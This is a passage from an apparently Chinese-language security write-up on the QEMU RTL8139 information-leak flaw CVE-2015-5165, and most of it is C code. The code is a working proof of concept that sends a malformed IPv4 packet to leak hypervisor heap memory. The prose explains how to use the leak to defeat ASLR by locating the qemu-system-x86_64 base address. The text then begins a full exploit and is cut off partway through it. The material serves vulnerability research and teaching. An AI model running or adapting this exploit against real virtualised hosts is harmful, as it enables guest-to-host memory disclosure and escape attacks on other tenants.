VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RT8139_ChipCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CmdReset    = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb    = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb    = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty  = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL8139_TxPollBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlus = <span class="number">0x40</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx descriptor</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx ring</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span>* <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span>* buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> rtl8139_packet[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Ethernet Frame Header æ•°æ®</span></span><br><span class="line">    <span class="comment">// DST MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// SRC MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// Length / Type: IPv4</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Ethernet Frame Payload æ•°æ®, å³ IPv4 æ•°æ®åŒ…</span></span><br><span class="line">    <span class="comment">// Version &amp; IHL(Internet Header Length)</span></span><br><span class="line">    (<span class="number">0x04</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x05</span>,    <span class="comment">// 0x05 * 4 = 20 bytes</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Total Length = 0x13 = 19 bytes</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,     <span class="comment">// 19 - 20 = -1 = 0xFFFF, trigger vulnerability</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Identification</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,     <span class="comment">// Flags &amp; Fragment Offset</span></span><br><span class="line">    <span class="number">0x40</span>,           <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x06</span>,           <span class="comment">// Protocol: TCP</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Header checksum</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Source IP: 127.0.0.1</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Destination IP: 127.0.0.1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IP Packet Payload æ•°æ®, å³ TCP æ•°æ®åŒ…</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Source Port</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,     <span class="comment">// Destination Port</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x50</span>,           <span class="comment">// 01010000, Header Length = 5 * 4 = 20</span></span><br><span class="line">    <span class="number">0x10</span>,           <span class="comment">// 00010000, ACK</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Window Size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>      <span class="comment">// Urgent Pointer</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(addr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring* ring, rtl8139_desc* desc, <span class="keyword">size_t</span> nb)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        </span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// descriptor owned by NIC å‡†å¤‡æ¥æ”¶æ•°æ®</span></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        <span class="keyword">if</span> (i == nb - <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            ring[i].desc-&gt;dw0 |= CP_RX_EOR; <span class="comment">// End of Ring</span></span><br><span class="line">        &#125;</span><br><span class="line">        ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;   <span class="comment">// buffer_size</span></span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Rx descriptors address</span></span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc* desc, <span class="keyword">void</span>* buffer)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN |    <span class="comment">// descriptor owned by NIC å‡†å¤‡å‘é€æ•°æ®</span></span><br><span class="line">                 CP_TX_EOR |</span><br><span class="line">                 CP_TX_LS |</span><br><span class="line">                 CP_TX_LGSEN |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS;</span><br><span class="line">    desc-&gt;dw0 += RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// è§¦å‘æ¼æ´éœ€è¦è®¾ç½®çš„ä¸€äº›å‚æ•°</span></span><br><span class="line">    outl(TxLoopBack, RTL8139_PORT + TxConfig);</span><br><span class="line">    outl(AcceptMyPhys, RTL8139_PORT + RxConfig);</span><br><span class="line">    outw(CPlusRxEnb | CPlusTxEnb, RTL8139_PORT + CpCmd);</span><br><span class="line">    outb(CmdRxEnb | CmdTxEnb, RTL8139_PORT + ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span>* buffer, <span class="keyword">void</span>* packet, <span class="keyword">size_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        outb(CPlus, RTL8139_PORT + TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span>* ptr, <span class="keyword">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n0x%08x: "</span>, ptr + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x "</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"- "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616</span></span><br><span class="line">    <span class="comment">// å¯ä»¥æ”¶å®Œ 65535 å­—èŠ‚æ•°æ®</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_ring));</span><br><span class="line">    rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    <span class="keyword">void</span>* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// change I/O privilege level</span></span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize Rx ring, Rx descriptor, Tx descriptor</span></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, </span><br><span class="line">                        <span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// print leaked data</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// RTL8139_BUFFER_SIZE ä¹‹å 4 å­—èŠ‚æ•°æ®ä¸º Checksum</span></span><br><span class="line">        <span class="comment">// ä¸æ‰“å°ä¹Ÿæ— æ‰€è°“äº†</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span>*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> free heap blocks</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œ PoC åï¼Œåœ¨æ¥æ”¶åˆ°çš„ä¸­é—´æŸäº›æ•°æ®åŒ…ä¸­å¯ä»¥çœ‹åˆ°æ³„éœ²çš„æ•°æ®ï¼š</p><p><img src="/uploads/202006/cve-2015-5165-poc.png" alt="QEMU æ¼æ´ CVE-2015-5165 PoC"></p><h3 id="4-5-æ¼æ´åˆ©ç”¨"><a href="#4-5-æ¼æ´åˆ©ç”¨" class="headerlink" title="4.5 æ¼æ´åˆ©ç”¨"></a>4.5 æ¼æ´åˆ©ç”¨</h3><p>Phrack æ–‡ç«  [1] æ¼æ´åˆ©ç”¨çš„æ€è·¯ä¸ºï¼šåœ¨æ³„éœ²çš„æ•°æ®ä¸­æœç´¢ä¿å­˜äº† <code>ObjectProperty</code> å¯¹è±¡çš„å †å—ï¼ˆå¯èƒ½æ˜¯å·²ç»è¢«é‡Šæ”¾çš„å †å—ï¼‰ï¼Œé€šè¿‡è¯»å– <code>ObjectProperty</code> å¯¹è±¡ä¸­ä¿å­˜çš„å‡½æ•°æŒ‡é’ˆæ¥æ³„éœ²æ¨¡å— <code>qemu-system-x86_64</code> çš„åŸºåœ°å€ã€‚</p><p>ç»“æ„ä½“ <code>ObjectProperty</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Q_TAILQ_ENTRY(type, qual)                               \</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span>                                                        \</span><br><span class="line">    qual type *tqe_next;        <span class="comment">/* next element */</span>              \</span><br><span class="line">    qual type *qual *tqe_prev;  <span class="comment">/* address of previous next element */</span>\</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTAILQ_ENTRY(type)       Q_TAILQ_ENTRY(struct type,)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectProperty</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    gchar *name;</span><br><span class="line">    gchar *type;</span><br><span class="line">    gchar *description;</span><br><span class="line">    ObjectPropertyAccessor *get;</span><br><span class="line">    ObjectPropertyAccessor *<span class="built_in">set</span>;</span><br><span class="line">    ObjectPropertyResolve *resolve;</span><br><span class="line">    ObjectPropertyRelease *release;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line"></span><br><span class="line">    QTAILQ_ENTRY(ObjectProperty) node;</span><br><span class="line">&#125; ObjectProperty;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ <code>get / set / resolve / release</code> ä¿å­˜çš„å€¼å‡ä¸ºå‡½æ•°æŒ‡é’ˆã€‚</p><p><strong>åˆ©ç”¨æ­¥éª¤ï¼š</strong></p><ol><li>ç»“æ„ä½“ <code>ObjectProperty</code> çš„å¤§å°ä¸º <code>0x50</code> å­—èŠ‚ï¼Œå› æ­¤åŒ…å« metadata çš„å †å—çš„å¤§å°ä¸º <code>0x60</code> å­—èŠ‚ï¼Œå¯ä»¥æ ¹æ®è¿™ä¸€ä¿¡æ¯å»æœç´¢æ³„éœ²çš„æ•°æ®ä¸­å­˜åœ¨çš„å †å—ï¼›</li><li>ASLR ä¸ä¼šå¯¹åœ°å€çš„ä½ <code>12</code> ä½è¿›è¡ŒéšæœºåŒ–å¤„ç†ï¼Œå› æ­¤å¯ä»¥ä»¥ç›¸å…³å‡½æ•°åœ°å€çš„ä½ <code>12</code> ä½ä¸ºç‰¹å¾è¿›è¡Œæœç´¢ï¼Œä»¥è®¡ç®—å‡ºæ¨¡å— <code>qemu-system-x86_64</code> çš„åŸºåœ°å€;</li><li>ç»Ÿè®¡æ³„éœ²çš„æ•°æ®ä¸­å‡ºç°çš„ <code>uint64_t</code> ç±»å‹çš„æ•°æ® <code>0x00007FXXYYZZZZZZ</code> ï¼Œå…¶ä¸­ <code>7FXXYY</code> å‡ºç°æ¬¡æ•°æœ€å¤šçš„æ•°æ®ï¼Œå°±æ˜¯ QEMU è™šæ‹Ÿæœºç‰©ç†å†…å­˜çš„ç»“æŸåœ°å€ï¼›</li></ol><p>åŸºäºå‰é¢çš„ PoC ä»£ç ï¼Œç¬”è€…é‡å†™çš„ä¸€ä»½ç”¨äºæµ‹è¯• CVE-2015-5165 çš„å®Œæ•´ Exploit ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é¡µé¢ç›¸å…³å‚æ•°</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame å¤§å°</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 ç½‘å¡ PMIO åœ°å€</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_PORT 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// w0 end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// Rx buffer size mask è¡¨ç¤º 0 ~ 12 ä½ä¸º buffer size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// Tx end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// last segment of received packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">// large send packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">// IP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">// TCP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_COUNT 0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE_MASK ~7ull</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 ç½‘å¡å¯„å­˜å™¨åç§»åœ°å€</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers </span><br><span class="line">&#123;</span><br><span class="line">    TxAddr0      = <span class="number">0x20</span>,    <span class="comment">// Tx descriptors address</span></span><br><span class="line">    ChipCmd      = <span class="number">0x37</span>,</span><br><span class="line">    TxConfig     = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig     = <span class="number">0x44</span>,</span><br><span class="line">    TxPoll       = <span class="number">0xD9</span>,    <span class="comment">// tell chip to check Tx descriptors for work</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>,    <span class="comment">// C+ Command register (C+ mode only)</span></span><br><span class="line">    <span class="comment">// è™½ç„¶åå­—å†™çš„ RxRingAddr, ä½†å®é™…ä¸Šæ˜¯ Rx descriptor çš„åœ°å€</span></span><br><span class="line">    RxRingAddrLO = <span class="number">0xE4</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">    RxRingAddrHI = <span class="number">0xE8</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits </span><br><span class="line">&#123;</span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">// enable loopback test mode</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits </span><br><span class="line">&#123;</span><br><span class="line">    AcceptErr       = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_CplusCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RT8139_ChipCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CmdReset    = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb    = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb    = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty  = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL8139_TxPollBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlus = <span class="number">0x40</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx descriptor</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx ring</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span>* <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span>* buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> rtl8139_packet[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Ethernet Frame Header æ•°æ®</span></span><br><span class="line">    <span class="comment">// DST MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// SRC MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// Length / Type: IPv4</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Ethernet Frame Payload æ•°æ®, å³ IPv4 æ•°æ®åŒ…</span></span><br><span class="line">    <span class="comment">// Version &amp; IHL(Internet Header Length)</span></span><br><span class="line">    (<span class="number">0x04</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x05</span>,    <span class="comment">// 0x05 * 4 = 20 bytes</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Total Length = 0x13 = 19 bytes</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,     <span class="comment">// 19 - 20 = -1 = 0xFFFF, trigger vulnerability</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// 